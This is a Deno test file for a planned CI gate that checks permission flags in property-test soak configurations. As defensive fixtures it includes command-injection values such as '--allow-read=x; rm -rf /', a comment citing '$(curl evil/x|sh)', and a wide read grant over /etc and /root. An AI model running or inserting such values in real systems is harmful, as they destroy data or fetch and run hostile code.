/**
 * Failing-first (TDD RED) tests for scripts/quality/check_soak.ts (does not
 * exist yet) — the PR-TIME compliance gate for the property-soak permission
 * pipeline. Unlike scripts/lib/soak_permissions.ts (the pure comparison
 * primitives) or scripts/soak_schedule.ts (the nightly bucket generator),
 * this module is the CI-facing checker that runs on every PR (mirroring
 * check_compliance.ts / check_allowlist.ts / check_property_harness.ts):
 * discovers every property test file, cross-checks it against soak_schedule's
 * bucket discovery (catching a file that structurally escapes it — the
 * jscad-cad defect this whole PR fixes), and surfaces every
 * scripts/lib/soak_permissions.ts violation class as a `{extension, rule,
 * what, why, fix}` Violation, with the same `::error` CI annotation shape
 * every sibling checker in this directory already uses.
 */
import { assert, assertEquals } from "jsr:@std/assert@1";
import { dirname, join } from "jsr:@std/path@1";
import { checkSoak, type Violation } from "./check_soak.ts";

async function writeExtension(
  root: string,
  name: string,
  opts: {
    testTask: string;
    propertyFile?: string; // relative to <ext>/, defaults to a well-formed anchored path
    qualityYaml?: string; // full quality.yaml text; omit for "no quality.yaml at all"
  },
): Promise<void> {
  const dir = join(root, name);
  await Deno.mkdir(dir, { recursive: true });
  await Deno.writeTextFile(join(dir, "manifest.yaml"), `name: ${name}\n`);
  await Deno.writeTextFile(
    join(dir, "deno.json"),
    JSON.stringify({ tasks: { test: opts.testTask } }),
  );
  const propertyFile = opts.propertyFile ??
    `extensions/models/${name.replaceAll("-", "_")}_property_test.ts`;
  const full = join(dir, propertyFile);
  await Deno.mkdir(dirname(full), { recursive: true });
  await Deno.writeTextFile(full, "");
  if (opts.qualityYaml !== undefined) {
    await Deno.writeTextFile(join(dir, "quality.yaml"), opts.qualityYaml);
  }
}

/** A minimal, otherwise-fully-compliant quality.yaml — check_soak.ts cares
 * only about the `soak:` block, but needs a schema-shaped document to read
 * one from, so every fixture mirrors check_compliance.test.ts's own
 * FULLY_COMPLIANT_YAML shape with an injected `soak:` block. */
function qualityYamlWithSoak(name: string, soakBlock: string): string {
  return `
schemaVersion: 1
extension: ${name}
tests:
  contract-fixture: { state: present, files: ["a_test.ts"] }
  methods: { state: present, files: ["a_test.ts"] }
  adversarial: { state: present, files: ["a_test.ts"] }
  coverage: { state: present, files: ["a_test.ts"] }
  property-invariant-flow: { state: present, files: ["a_test.ts"] }
watch: { state: na, justification: "no external dependency to watch at all" }
canary: { state: na, justification: "no live instance exists for this one" }
docs:
  readme: { state: present, files: ["README.md"] }
  changelog: { state: na, justification: "unreleased, no changelog needed yet" }
  skill: { state: na, justification: "bundles no Claude skill whatsoever" }
ratchet: { rubricVersion: 3, baselinePercentage: 100, label: "Grade A" }
${soakBlock}
`;
}

// ---------------------------------------------------------------------------
// Orphaned property files — a *_property_test.ts file that structurally
// escapes discovery (never appears in any night's bucket, has never been
// soaked). Fixtured as a file nested inside extensions/ but OUTSIDE
// extensions/models/ — a real, plausible shape (music-library's own repo
// layout has extensions/reports/, extensions/lib/, extensions/workflows/
// siblings to extensions/models/) that stays orphaned even once
// discoverPropertyTestFiles is fixed to recurse under extensions/models/,
// since it is anchored specifically to that directory, not all of
// extensions/.
// ---------------------------------------------------------------------------

Deno.test("checkSoak: reports an orphaned property file that lives outside extensions/models/ entirely", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-orphan-" });
  try {
    await writeExtension(root, "widget", {
      testTask: "deno test --allow-env=FC_NUM_RUNS extensions/models/",
      propertyFile: "extensions/reports/widget_property_test.ts",
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.rule === "orphaned-property-file"
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: a property file properly anchored under extensions/models/ (even nested) is NOT reported as orphaned", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-orphan-" });
  try {
    await writeExtension(root, "jscad-cad", {
      testTask:
        "deno test extensions/models/ --permit-no-files --allow-read --allow-write --allow-run --allow-env --allow-net",
      propertyFile: "extensions/models/jscad/jscad_cad_property_test.ts",
      qualityYaml: qualityYamlWithSoak(
        "jscad-cad",
        'soak: { state: present, denoArgs: ["--allow-read", "--allow-write", "--allow-env=FC_NUM_RUNS"] }',
      ),
    });
    const result = await checkSoak(root);
    assert(
      result.violations.every((v: Violation) =>
        v.rule !== "orphaned-property-file"
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

// ---------------------------------------------------------------------------
// Every soak_permissions.ts violation class surfaced as a check_soak
// Violation.
// ---------------------------------------------------------------------------

Deno.test("checkSoak: surfaces an INVALID TOKEN (shell metacharacter) in a soak.denoArgs entry", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-token-" });
  try {
    await writeExtension(root, "widget", {
      testTask:
        "deno test --allow-read --allow-env=FC_NUM_RUNS extensions/models/",
      qualityYaml: qualityYamlWithSoak(
        "widget",
        'soak: { state: present, denoArgs: ["--allow-read=x; rm -rf /", "--allow-env=FC_NUM_RUNS"] }',
      ),
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.extension === "widget" &&
        (v.rule.includes("token") || v.what.toLowerCase().includes("token"))
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: surfaces an UNSAFE PATH for a discovered property file outside the safe charset", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-path-" });
  try {
    await writeExtension(root, "widget", {
      testTask: "deno test --allow-env=FC_NUM_RUNS extensions/models/",
      propertyFile: "extensions/models/evil file_property_test.ts",
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.rule.includes("path") || v.what.toLowerCase().includes("path")
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: surfaces MISSING FC_NUM_RUNS when soak.denoArgs has a scoped --allow-env that omits it", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-fcnumruns-" });
  try {
    await writeExtension(root, "widget", {
      testTask: "deno test --allow-env=FC_NUM_RUNS,OTHER extensions/models/",
      qualityYaml: qualityYamlWithSoak(
        "widget",
        'soak: { state: present, denoArgs: ["--allow-env=OTHER"] }',
      ),
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) => v.what.includes("FC_NUM_RUNS")),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: surfaces a BROAD GRANT WITH NO quality.yaml soak: BLOCK (swamp-go-brr's real --allow-all, no override)", async () => {
  // The approved, EXACT definition of "broad": --allow-all, OR unscoped
  // --allow-run, OR unscoped --allow-net. Nothing else — in particular,
  // unscoped --allow-write/--allow-read and any SCOPED grant (including a
  // comma-scoped --allow-env) are NOT broad (see
  // scripts/lib/soak_permissions.test.ts's isBroadGrant tests for the full
  // matrix). swamp-go-brr's real test task is bare --allow-all — the widest
  // possible grant — with no quality.yaml at all, so an unattended nightly
  // soak would inherit it silently. check_soak.ts must flag that absence so
  // a human reviews/narrows it (exactly as swamp-go-brr's real,
  // already-accepted override in soak_permissions.test.ts does).
  const root = await Deno.makeTempDir({ prefix: "check-soak-broad-" });
  try {
    await writeExtension(root, "swamp-go-brr", {
      testTask: "deno test --permit-no-files --allow-all extensions/models/",
      // deliberately NO quality.yaml at all — the common/default case.
    });
    const result = await checkSoak(root);
    const flagged = result.violations.filter((v: Violation) =>
      v.extension === "swamp-go-brr" &&
      v.rule === "soak-broad-grant-no-override"
    );
    assert(flagged.length > 0, JSON.stringify(result.violations));
    assert(
      flagged.some((v: Violation) =>
        v.what.toLowerCase().includes("allow-all") ||
        v.why.toLowerCase().includes("allow-all")
      ),
      JSON.stringify(flagged),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: does NOT flag an extension merely for needing extra (non-broad) permissions — flipper-zero's real test task has no --allow-all/unscoped-run/unscoped-net", async () => {
  // The negative half of the fix above, pinned permanently: flipper-zero's
  // real test task needs strictly MORE than the trivial FC_NUM_RUNS
  // baseline (a comma-scoped --allow-env=FC_NUM_RUNS,HOME,SWAMP_DENO_PATH
  // and a scoped --allow-read=bots/snake_bot.ts) — but neither is
  // --allow-all, unscoped --allow-run, nor unscoped --allow-net, so under
  // the approved narrow definition it is NOT a broad grant. Requiring a
  // hand-written quality.yaml soak: override here (or for any of the other
  // 23 extensions in the same shape) would be a 24-file scope explosion
  // that defeats PR B's premise: the test task is the source of truth, and
  // soak: is a RARE, human-reviewed narrowing exception — not a
  // per-extension declaration triggered by needing any permission at all.
  // (flipper-zero's actual defect — its test:soak task dropping flags its
  // test task has — is PR C's parity gate, not this one.)
  const root = await Deno.makeTempDir({ prefix: "check-soak-not-broad-" });
  try {
    await writeExtension(root, "flipper-zero", {
      testTask:
        "deno test --allow-env=FC_NUM_RUNS,HOME,SWAMP_DENO_PATH --allow-read=bots/snake_bot.ts extensions/models/",
      // deliberately NO quality.yaml — none should be required.
    });
    const result = await checkSoak(root);
    assertEquals(
      result.violations.filter((v: Violation) =>
        v.extension === "flipper-zero"
      ),
      [],
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: surfaces a SOAK BLOCK EXCEEDING its test task's authority", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-exceeds-" });
  try {
    await writeExtension(root, "widget", {
      testTask: "deno test --allow-env=FC_NUM_RUNS extensions/models/",
      qualityYaml: qualityYamlWithSoak(
        "widget",
        // test task never grants --allow-net at all.
        'soak: { state: present, denoArgs: ["--allow-env=FC_NUM_RUNS", "--allow-net"] }',
      ),
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.rule === "soak-exceeds-test-authority"
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: surfaces the CRITICAL exploit fixture — a wide-then-narrow two-entry --allow-read override that used to pass under last-wins now UNIONS to exceed test's authority", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-union-exploit-" });
  try {
    await writeExtension(root, "widget", {
      testTask:
        "deno test --allow-read=./fixtures --allow-env=FC_NUM_RUNS extensions/models/",
      qualityYaml: qualityYamlWithSoak(
        "widget",
        'soak: { state: present, denoArgs: ["--allow-read=/etc,/root,/home/runner", "--allow-read=./fixtures", "--allow-env=FC_NUM_RUNS"] }',
      ),
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.extension === "widget" && v.rule === "soak-exceeds-test-authority"
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: surfaces a soak.denoArgs override that REPEATS --allow-net (deno hard-rejects this outright at soak time)", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-dup-net-" });
  try {
    await writeExtension(root, "widget", {
      testTask:
        "deno test --allow-net --allow-env=FC_NUM_RUNS extensions/models/",
      qualityYaml: qualityYamlWithSoak(
        "widget",
        'soak: { state: present, denoArgs: ["--allow-net=a.example.com", "--allow-net=b.example.com", "--allow-env=FC_NUM_RUNS"] }',
      ),
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.extension === "widget" &&
        v.rule === "duplicate-hard-reject-flag"
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: surfaces a soak.denoArgs override that COMBINES --allow-all with another --allow-X flag (deno hard-rejects this outright — the MEDIUM finding this pins, reproduced with swamp-go-brr's real shape)", async () => {
  // Before this fix, checkSoakAuthority + validateSoakAdequacy +
  // validateNoDuplicateHardRejectFlags + validateTokenSafety ALL approved
  // this combination cleanly (verified live end-to-end against the real
  // exported functions): checkSoakAuthority's rule (a) doesn't fire because
  // both test and soak grant --allow-all; its per-key loop skips the
  // --allow-env entry entirely because test.allowAll covers it;
  // validateSoakAdequacy short-circuits on soak.allowAll;
  // validateNoDuplicateHardRejectFlags only looks for a REPEATED same-kind
  // flag, not an --allow-all/--allow-X co-occurrence. Running this exact
  // denoArgs pair through the real `deno test` binary confirms it exits 1
  // before executing a single test.
  const root = await Deno.makeTempDir({ prefix: "check-soak-allowall-mix-" });
  try {
    await writeExtension(root, "swamp-go-brr", {
      testTask: "deno test --permit-no-files --allow-all extensions/models/",
      qualityYaml: qualityYamlWithSoak(
        "swamp-go-brr",
        'soak: { state: present, denoArgs: ["--allow-all", "--allow-env=FC_NUM_RUNS"] }',
      ),
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.extension === "swamp-go-brr" &&
        v.rule === "allow-all-with-other-allow-flag"
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: does NOT flag a soak.denoArgs override that is bare --allow-all alone (no other --allow-X flag)", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-allowall-alone-" });
  try {
    await writeExtension(root, "swamp-go-brr", {
      testTask: "deno test --permit-no-files --allow-all extensions/models/",
      qualityYaml: qualityYamlWithSoak(
        "swamp-go-brr",
        'soak: { state: present, denoArgs: ["--allow-all"] }',
      ),
    });
    const result = await checkSoak(root);
    assertEquals(
      result.violations.filter((v: Violation) =>
        v.rule === "allow-all-with-other-allow-flag"
      ),
      [],
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: surfaces INADEQUATE FC_NUM_RUNS coverage on the DERIVED path — no quality.yaml override at all", async () => {
  // The HIGH finding this pins: validateSoakAdequacy used to run ONLY on the
  // quality.yaml soak: override path. When an extension has no override at
  // all (the default, 48/51-extension case), a scoped --allow-env omitting
  // FC_NUM_RUNS in its OWN test task used to slip through this gate clean,
  // then silently run its nightly soak at the small fallback iteration
  // count.
  const root = await Deno.makeTempDir({
    prefix: "check-soak-derived-fcnumruns-",
  });
  try {
    await writeExtension(root, "widget", {
      testTask:
        "deno test --allow-env=SOME_OTHER_VAR --allow-read extensions/models/",
      // deliberately NO quality.yaml at all.
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.extension === "widget" && v.what.includes("FC_NUM_RUNS")
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: surfaces an UNSAFE TOKEN on the DERIVED path — no quality.yaml override, the token comes straight from deno.json's test task", async () => {
  // The MEDIUM finding this pins: validateTokenSafety used to run ONLY
  // against a quality.yaml soak.denoArgs override. A deno.json test task
  // token like --allow-read=$(curl evil/x|sh) used to round-trip through
  // parsePermissionSet -> permissionSetToArgs into the derived soak argv
  // with its unsafe characters intact and unflagged.
  const root = await Deno.makeTempDir({ prefix: "check-soak-derived-token-" });
  try {
    await writeExtension(root, "widget", {
      testTask:
        "deno test --allow-read=x; rm -rf / --allow-env=FC_NUM_RUNS extensions/models/",
      // deliberately NO quality.yaml at all.
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.extension === "widget" &&
        (v.rule.includes("token") || v.what.toLowerCase().includes("token"))
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

// ---------------------------------------------------------------------------
// Unrecognized flags on the test task — the --v8-flags-dropping defect's
// PR-time gate. resolveDenoArgs's derivation (soak_schedule.ts) used to
// silently DISCARD any "--"-prefixed test-task token it didn't recognize as
// a permission flag — the exact mechanism that dropped
// --v8-flags=--expose-gc from seanime's/seadex's derived soak argv and
// silently skipped their heap-pin regression tests every nightly run.
// ---------------------------------------------------------------------------

Deno.test("checkSoak: surfaces an UNRECOGNIZED FLAG on the test task (an invented --totally-new-flag) as a violation, never silently dropped", async () => {
  const root = await Deno.makeTempDir({
    prefix: "check-soak-unknown-flag-",
  });
  try {
    await writeExtension(root, "widget", {
      testTask:
        "deno test --totally-new-flag --allow-env=FC_NUM_RUNS extensions/models/",
      // deliberately NO quality.yaml at all — the DERIVED path.
    });
    const result = await checkSoak(root);
    assert(
      result.violations.some((v: Violation) =>
        v.extension === "widget" &&
        v.rule === "soak-unrecognized-flag-silently-dropped" &&
        v.what.includes("--totally-new-flag")
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: does NOT flag --v8-flags=--expose-gc (seanime's/seadex's real shape) — a recognized runtime flag, never a violation", async () => {
  const root = await Deno.makeTempDir({
    prefix: "check-soak-v8flags-ok-",
  });
  try {
    await writeExtension(root, "widget", {
      testTask:
        "deno test --v8-flags=--expose-gc --allow-env=FC_NUM_RUNS extensions/models/ --permit-no-files",
    });
    const result = await checkSoak(root);
    assert(
      !result.violations.some((v: Violation) =>
        v.rule === "soak-unrecognized-flag-silently-dropped"
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: does NOT flag --permit-no-files or --ignore=... — both are explicitly-listed, deliberately-dropped flags, never a violation", async () => {
  const root = await Deno.makeTempDir({
    prefix: "check-soak-dropped-flags-ok-",
  });
  try {
    await writeExtension(root, "widget", {
      testTask:
        "deno test --ignore=extensions/models/lib/skip.test.ts --allow-read " +
        "--allow-env=FC_NUM_RUNS extensions/models/ --permit-no-files",
    });
    const result = await checkSoak(root);
    assert(
      !result.violations.some((v: Violation) =>
        v.rule === "soak-unrecognized-flag-silently-dropped"
      ),
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: the REAL repo (this checkout) has zero soak-unrecognized-flag-silently-dropped violations — the gate is green on current master apart from what this PR fixes", async () => {
  const repoRoot = join(dirname(new URL(import.meta.url).pathname), "..", "..");
  const result = await checkSoak(repoRoot);
  const unknownFlagViolations = result.violations.filter((v: Violation) =>
    v.rule === "soak-unrecognized-flag-silently-dropped"
  );
  assertEquals(
    unknownFlagViolations,
    [],
    `expected every real extension's test task to be fully accounted for ` +
      `(recognized permission flag, recognized runtime flag, or ` +
      `deliberately-dropped), got: ${JSON.stringify(unknownFlagViolations)}`,
  );
});

Deno.test("checkSoak: an orphaned-property-file violation's ::error annotation points at the REAL offending file, not quality.yaml", async () => {
  const root = await Deno.makeTempDir({
    prefix: "check-soak-annotation-file-",
  });
  try {
    await writeExtension(root, "orphanext", {
      testTask: "deno test --allow-env=FC_NUM_RUNS extensions/models/",
      propertyFile: "extensions/lib/orphanext_property_test.ts",
    });
    const scriptUrl = new URL("./check_soak.ts", import.meta.url);
    const cmd = new Deno.Command(Deno.execPath(), {
      args: [
        "run",
        "--allow-read",
        "--allow-write",
        "--allow-env",
        scriptUrl.pathname,
      ],
      env: { QUALITY_REPO_ROOT: root },
      stdout: "piped",
      stderr: "piped",
    });
    const { stdout } = await cmd.output();
    const out = new TextDecoder().decode(stdout);
    assert(
      out.includes(
        "::error file=orphanext/extensions/lib/orphanext_property_test.ts::",
      ),
      `expected the annotation to point at the real orphaned file, not quality.yaml, got: ${out}`,
    );
    assert(
      !out.includes("::error file=orphanext/quality.yaml::"),
      `expected NO quality.yaml annotation for an orphaned-property-file violation, got: ${out}`,
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("checkSoak: a fully compliant extension (narrowed soak: override, no orphans, no drift) produces zero violations", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-clean-" });
  try {
    await writeExtension(root, "stripe-mpp", {
      testTask: "deno test --allow-net --allow-env extensions/models/",
      qualityYaml: qualityYamlWithSoak(
        "stripe-mpp",
        'soak: { state: present, denoArgs: ["--allow-env"] }',
      ),
    });
    const result = await checkSoak(root);
    assertEquals(
      result.violations.filter((v: Violation) => v.extension === "stripe-mpp"),
      [],
      JSON.stringify(result.violations),
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

// ---------------------------------------------------------------------------
// Violation shape parity with check_compliance.ts / check_allowlist.ts /
// check_property_harness.ts — {rule, what, why, fix}, every field non-empty.
// ---------------------------------------------------------------------------

Deno.test("checkSoak: every violation has non-empty rule/what/why/fix (matches the other quality checkers exactly)", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-shape-" });
  try {
    await writeExtension(root, "widget", {
      testTask: "deno test --allow-env=FC_NUM_RUNS extensions/models/",
      propertyFile: "extensions/reports/widget_property_test.ts", // orphan
    });
    const result = await checkSoak(root);
    assert(result.violations.length > 0);
    for (const v of result.violations satisfies Violation[]) {
      assert(v.extension.length > 0, "missing extension");
      assert(v.rule.length > 0, "missing rule");
      assert(v.what.length > 0, "missing WHAT");
      assert(v.why.length > 0, "missing WHY");
      assert(v.fix.length > 0, "missing FIX");
    }
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

// ---------------------------------------------------------------------------
// CLI: --help, --json, exit codes, ::error annotations — same contract as
// check_compliance.ts / check_allowlist.ts / check_property_harness.ts.
// ---------------------------------------------------------------------------

Deno.test("check_soak.ts --help exits 0 with non-empty usage output", async () => {
  const scriptUrl = new URL("./check_soak.ts", import.meta.url);
  const cmd = new Deno.Command(Deno.execPath(), {
    args: ["run", "--allow-read", scriptUrl.pathname, "--help"],
    stdout: "piped",
    stderr: "piped",
  });
  const { code, stdout } = await cmd.output();
  assertEquals(code, 0);
  assert(new TextDecoder().decode(stdout).length > 0);
});

Deno.test("check_soak.ts CLI exits 0 and reports no violations for a clean fixture root", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-cli-clean-" });
  try {
    await writeExtension(root, "stripe-mpp", {
      testTask: "deno test --allow-net --allow-env extensions/models/",
      qualityYaml: qualityYamlWithSoak(
        "stripe-mpp",
        'soak: { state: present, denoArgs: ["--allow-env"] }',
      ),
    });
    const jsonPath = join(root, "summary.json");
    const scriptUrl = new URL("./check_soak.ts", import.meta.url);
    const cmd = new Deno.Command(Deno.execPath(), {
      args: [
        "run",
        "--allow-read",
        "--allow-write",
        "--allow-env",
        scriptUrl.pathname,
        "--json",
        jsonPath,
      ],
      env: { QUALITY_REPO_ROOT: root },
      stdout: "piped",
      stderr: "piped",
    });
    const { code, stderr } = await cmd.output();
    assertEquals(code, 0, new TextDecoder().decode(stderr));
    const summary = JSON.parse(await Deno.readTextFile(jsonPath));
    assertEquals(summary.violations, []);
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("check_soak.ts CLI exits 1 and emits a ::error annotation per violation", async () => {
  const root = await Deno.makeTempDir({ prefix: "check-soak-cli-dirty-" });
  try {
    await writeExtension(root, "widget", {
      testTask: "deno test --allow-env=FC_NUM_RUNS extensions/models/",
      propertyFile: "extensions/reports/widget_property_test.ts", // orphan
    });
    const scriptUrl = new URL("./check_soak.ts", import.meta.url);
    const cmd = new Deno.Command(Deno.execPath(), {
      args: [
        "run",
        "--allow-read",
        "--allow-write",
        "--allow-env",
        scriptUrl.pathname,
      ],
      env: { QUALITY_REPO_ROOT: root },
      stdout: "piped",
      stderr: "piped",
    });
    const { code, stdout } = await cmd.output();
    assertEquals(code, 1);
    assert(new TextDecoder().decode(stdout).includes("::error"));
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});
